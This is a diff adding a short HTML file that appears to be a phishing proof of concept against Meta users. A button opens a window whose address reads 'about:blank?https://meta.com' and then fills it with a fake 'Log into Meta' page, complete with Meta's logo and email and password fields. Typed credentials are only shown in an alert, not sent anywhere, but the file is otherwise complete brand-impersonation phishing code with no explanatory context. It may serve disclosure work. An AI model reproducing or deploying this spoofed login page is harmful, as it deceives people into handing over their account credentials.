@@ -1,0 +1,48 @@
+
+
+<center><br><br><br><br><button style=font-size:100px; onclick=x();>Click me
+
+    <script>
+    var j='';
+    function x(){
+    j = window.open(`about:blank?https://meta.com`,`j`)
+    
+    setTimeout(() => {
+            j.document.body.innerHTML = `
+              <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;font-family:Arial, sans-serif;background:#f0f2f5;margin:0;">
+                
+                <!-- Logo -->
+                <div style="margin-bottom:30px;text-align:center;">
+                  <img src="https://registry.npmmirror.com/@lobehub/icons-static-png/latest/files/dark/meta-color.png" alt="Meta Logo" style="width:120px;height:auto;">
+                </div>
+                
+                <!-- Login Card -->
+                <div style="background:white;padding:40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:360px;text-align:center;">
+                  <h2 style="margin-bottom:20px;color:#1c1e21;">Log into Meta</h2>
+                  
+                  <input id="user" type="text" placeholder="Email or Phone" 
+                    style="width:100%;padding:12px;margin-bottom:15px;font-size:16px;border:1px solid #ddd;border-radius:6px;">
+                  
+                  <input id="pass" type="password" placeholder="Password" 
+                    style="width:100%;padding:12px;margin-bottom:20px;font-size:16px;border:1px solid #ddd;border-radius:6px;">
+                  
+                  <button onclick="alert('Email/Phone: '+document.getElementById('user').value+'\\nPassword: '+document.getElementById('pass').value)" 
+                    style="width:100%;padding:14px;font-size:18px;background:#1877f2;color:white;border:none;border-radius:6px;cursor:pointer;">
+                    Log In
+                  </button>
+                  
+                  <div style="margin-top:20px;">
+                    <a href="#" style="color:#1877f2;text-decoration:none;font-size:14px;">Forgotten password?</a>
+                  </div>
+                </div>
+                
+                <!-- Footer -->
+                <div style="margin-top:30px;font-size:14px;color:#606770;">
+                  <p>Don't have an account? <a href="#" style="color:#1877f2;text-decoration:none;">Sign up</a></p>
+                </div>
+              </div>
+            `;
+          }, 250);
+    }
+    </script>
+    
